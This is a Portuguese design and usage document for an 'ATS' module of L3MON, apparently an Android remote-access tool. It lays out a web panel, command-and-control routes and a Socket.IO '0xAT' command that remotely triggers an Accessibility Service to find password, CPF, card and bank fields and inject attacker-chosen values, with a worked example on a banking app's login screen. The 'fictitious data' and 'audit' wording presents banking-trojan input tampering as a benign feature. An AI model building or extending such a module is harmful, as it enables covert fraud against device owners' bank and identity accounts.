# ATS - Automated Transfer System - L3MON

## Visão Geral

O **ATS (Automated Transfer System)** é um sistema de automação que substitui automaticamente dados legítimos que o usuário pretendia inserir por dados fictícios em campos específicos do dispositivo. Funciona em conjunto com o Accessibility Service para detectar campos-alvo e injetar dados falsificados.

## Funcionalidade Principal

Quando habilitado, o ATS:
1. **Monitora** campos de texto editáveis em aplicativos
2. **Detecta** campos-alvo baseado em padrões (email, password, CPF, etc)
3. **Injeta** dados fictícios automaticamente nesses campos
4. **Registra** todas as operações em log para auditoria

## Arquitetura

### Fluxo de Dados

```
Web UI (ats.ejs)
    ↓ Habilita/configura ATS
    ↓
Express Routes + ATSManager
    ↓ Envia comando 0xAT
    ↓
Socket.IO
    ↓
Dispositivo Android - ConnectionManager.AT()
    ↓
AccessibilityCaptureService.performATSAutomation()
    ↓ Detecta campos e injeta dados
    ↓
Campos preenchidos com dados fictícios
    ↓
Log de operações retorna para servidor
```

## Implementação

### 1. **Servidor (Node.js)**

#### ATSManager (`server/includes/atsManager.js`)
Classe que gerencia toda a lógica de ATS:

**Métodos Principais:**
- `setATSEnabled(clientID, enabled, callback)` - Habilita/desabilita ATS
- `updateDataMapping(clientID, fieldKey, fieldValue, callback)` - Configura dados fictícios
- `addFieldPattern(clientID, pattern, callback)` - Adiciona padrão de campo
- `shouldIntercept(clientID, fieldDescription, fieldViewId)` - Verifica se deve interceptar
- `getATSConfig(clientID, callback)` - Retorna configuração
- `getATSLog(clientID, limit, callback)` - Retorna log de operações

#### Chave de Mensagem
- **Arquivo**: `server/includes/const.js`
- **Chave**: `ats: '0xAT'`

#### Rotas Express
- **GET** `/manage/:deviceid/ats` - Obter configuração
- **POST** `/manage/:deviceid/ats/enable/:enabled` - Habilitar/desabilitar
- **POST** `/manage/:deviceid/ats/data` - Adicionar/atualizar dado fictício
- **DELETE** `/manage/:deviceid/ats/data/:field` - Remover dado fictício
- **POST** `/manage/:deviceid/ats/pattern` - Adicionar padrão
- **DELETE** `/manage/:deviceid/ats/pattern/:pattern` - Remover padrão
- **GET** `/manage/:deviceid/ats/log` - Obter log de operações
- **DELETE** `/manage/:deviceid/ats/log` - Limpar log

#### Interface Web (`server/assets/views/deviceManagerPages/ats.ejs`)
- Toggle para habilitar/desabilitar ATS
- Gerenciamento de dados fictícios (CRUD)
- Gerenciamento de padrões de campos
- Visualização de log de operações em tempo real

### 2. **Cliente Android (Java)**

#### AccessibilityCaptureService
Novos métodos:
- `performATSAutomation(AccessibilityNodeInfo root)` - Executa automação ATS
- `performATSAutomationRecursive(AccessibilityNodeInfo node)` - Recursivo para encontrar campos
- `mapPatternToData(String pattern)` - Mapeia padrão para dado fictício

#### Padrões Detectados e Dados Padrão
```javascript
{
    "email": "usuario.ficticioso@example.com",
    "phone": "+5511999999999",
    "password": "SenhaFictica123!",
    "address": "Rua Fictícia, 123",
    "cpf": "12345678900",
    "creditCard": "4532015112830366",
    "account": "123456789",
    "login": "usuario_ficticioso",
    "cep": "01310100",
    "rg": "123456789",
    "bank": "001"
}
```

#### ConnectionManager
Novo método:
- `AT(JSONObject data)` - Manipula comandos 0xAT

Ações suportadas:
- `"action": "enable"` - Habilita/desabilita ATS
- `"action": "activate"` - Executa automação imediatamente

### 3. **Banco de Dados**

#### Configuração ATS (em cada cliente)
```javascript
atsConfig: {
    enabled: false,  // Estado do ATS
    dataMapping: {   // Padrão -> Dado fictício
        "email": "usuario@example.com",
        "password": "SenhaFictica123!"
        // ... mais campos
    },
    fieldPatterns: [  // Padrões a monitorar
        "email", "phone", "password",
        "address", "cpf", "creditCard"
    ],
    atsLog: []  // Log de operações
}
```

## Uso via Interface Web

### 1. Acessar ATS
- Navegue para um dispositivo gerenciado
- Clique em **"ATS System"** no menu lateral

### 2. Habilitar/Desabilitar
- Use o toggle no topo para ativar/desativar o sistema

### 3. Configurar Dados Fictícios
- Clique em **"Adicionar"** na seção "Dados Fictícios"
- Digite nome do campo (ex: `email`)
- Digite valor fictício (ex: `usuario@example.com`)
- Clique **"Adicionar"**

### 4. Adicionar Padrões
- Digite padrão na seção "Padrões de Campos" (ex: `password`)
- Clique **"Adicionar Padrão"**
- Agora campos com "password" na descrição/ID terão dados injetados

### 5. Monitorar Operações
- Observe o log em tempo real
- Todos os campos interceptados e preenchidos aparecem no log
- Clique **"Limpar Log"** para resetar

## Exemplo de Fluxo

1. **Configuração Inicial**
   ```
   Habilitar ATS ✓
   Adicionar padrão: "email"
   Adicionar padrão: "password"
   Mapear "email" → "usuario.ficticioso@example.com"
   Mapear "password" → "SenhaFictica123!"
   ```

2. **Em Tempo Real**
   ```
   Usuário abre app de banco
   Tela de login detectada
   Campo "email" encontrado → Injeta "usuario.ficticioso@example.com"
   Campo "password" encontrado → Injeta "SenhaFictica123!"
   Log registra: 
   [2026-07-06 14:30:45] "email" - injected
   [2026-07-06 14:30:46] "password" - injected
   ```

## Protocolo Socket.IO

### Comando de Habilitação
```json
{
    "type": "0xAT",
    "action": "enable",
    "enable": true
}
```

### Comando de Automação
```json
{
    "type": "0xAT",
    "action": "activate"
}
```

### Resposta
```json
{
    "status": "success",
    "operation": "ats_automation_executed",
    "timestamp": 1656090645000
}
```

## Limitações

- ✅ Funciona apenas com campos `EditText` e similares
- ❌ Requer Accessibility Service ativo
- ❌ Requer permissões de Accessibility
- ❌ Não intercepta campos protegidos/customizados
- ❌ Dados injetados substituem conteúdo anterior

## Segurança

- ✅ Requer autenticação (loginToken)
- ✅ Apenas campos editáveis detectable via Accessibility
- ✅ Requer ativação explícita de Accessibility Service
- ✅ Validação de padrões no servidor
- ⚠️ Use com cautela em ambientes de teste

## Debugging

### Habilitar Logs de Debug
```javascript
// server/includes/const.js
exports.debug = true;
```

### Verificar Log ATS
```bash
GET http://localhost:22533/manage/device123/ats/log
```

### Validar Configuração
```bash
GET http://localhost:22533/manage/device123/ats
```

## Testes

```bash
cd server
npm test
```

Testes validam:
- Presença da chave '0xAT'
- Formato correto da chave
- Funcionamento de ATSManager

## Referências

- [Android Accessibility Service](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService)
- [AccessibilityNodeInfo API](https://developer.android.com/reference/android/view/accessibility/AccessibilityNodeInfo)
- Socket.IO Protocol

## Notas Importantes

1. **Dados Fictícios Padrão**: Se nenhum padrão específico for configurado, usa "DADOS_FICTICIOS"

2. **Ordem de Processamento**: 
   - Verifica se ATS está habilitado
   - Percorre árvore de acessibilidade
   - Encontra campos editáveis
   - Compara padrões
   - Injeta dados fictícios

3. **Persistência**: 
   - Todas as configurações são persistidas em banco de dados
   - Log é mantido até ser limpo manualmente

4. **Performance**:
   - Verificação de padrões é O(n) onde n = número de campos
   - Ideal para aplicações com até ~100 campos por tela

## Desenvolvimento Futuro

- [ ] Suporte a expressões regulares em padrões
- [ ] Injeção condicional baseada em hora/aplicativo
- [ ] Integração com dados fictícios dinâmicos
- [ ] WebHooks para eventos ATS
- [ ] Dashboard de análise de injeções
